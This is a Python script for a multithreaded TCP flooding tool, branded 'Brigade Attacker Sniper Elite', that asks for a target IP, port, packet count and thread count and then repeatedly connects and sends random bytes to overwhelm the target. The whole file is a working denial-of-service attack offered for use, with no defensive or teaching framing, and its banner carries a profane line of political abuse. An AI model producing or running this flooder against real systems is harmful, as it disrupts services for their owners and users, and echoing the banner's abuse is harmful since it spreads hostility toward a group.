# _*_ coding: utf-8 _*_
import os
import socket
import threading
import time
import random
import progressbar

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ZH = '\033[97m'

# CLEAR
os.system("clear")
print(" ")
print("\033[31m  © © ©© ©©        ©© © ©      ©© © ©          \033[0m")
print("\033[31m      ©©         ©©            ©©     ©           \033[0m")
print("\033[31m      ©©         ©©            ©©     ©           \033[0m")
print("\033[33m      ©©         ©©            ©© © ©            \033[0m")
print("\033[33m      @@           @@ @ @      @@             \033[0m")
print("\033[33m      °°           °° ° °      °°            \033[0m")
print("\033[33m       °              °        °              \033[0m")
print("\033[4m                                                                             \033[0m")   
print("\033[32m         ©© © © ©   ©©            ©© ©           ©© ©       ©© © ©          \033[0m")
print("\033[32m         ©©         ©©          ©©      ©     ©©      ©     ©©     ©        \033[0m")
print("\033[32m         ©©         ©©         ©©        ©   ©©        ©    ©©      ©       \033[0m")
print("\033[32m         ©© © © ©   ©©         ©©        ©   ©©        ©    ©©      ©       \033[0m")
print("\033[32m         @@         @@          @@      @     @@      @     @@     @        \033[0m")
print("\033[32m         @@         ®® @ @ @       @@ @          @@ @       @@ @ @          \033[0m")
print("\033[32m         °°         °°  ° °        °°°           °° °       °° °            \033[0m")
print("\033[32m         °           °  °           °             °          °°             \033[0m")
print("\033[93m==================================≠==≠======≠≠============≠=========== \033[0m")
print("\033[93m       B R I G A D E  A T T A C K E R  S N I P E R  E L I T E          \033[0m")
print("\033[93m                     design by: znan.ahmad                             \033[0m")
print("\033[93m                     Specialist attack TCP                             \033[0m")
print("\033[93m                          zion fuck !!                                 \033[0m")
print("\033[93m====================================================================== \033[0m")
print("\033[94m----------------------------")
ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
print("\033[94m----------------------------")
port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
print("\033[94m----------------------------")
packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
print("\033[94m----------------------------")
thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
print("\033[94m----------------------------")
  
  
def animated_marker():
    widgets = ['\033[94m[\033[97m#\033[94m#\033[97mLoading: progressbar.AnimatedMarker()\033[0m']
    bar = progressbar.ProgressBar(widgets=widgets).start()
      
    for i in range(50):
        time.sleep(0.1)
        bar.update(i)
          
animated_marker()

def start():
  r = random._urandom(10)
  u = int(0)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(r)
      for i in range(packs):
        s.send(r)
        u += 1
        print("\033[92m[\033[97m+\033[92m]\033[92mMengirim-packet: " +str(u)+ " \033[93mMematuk-Mangsa" +ip+ "\033[0m" )
    except:
      s.close()
      print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")

for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()
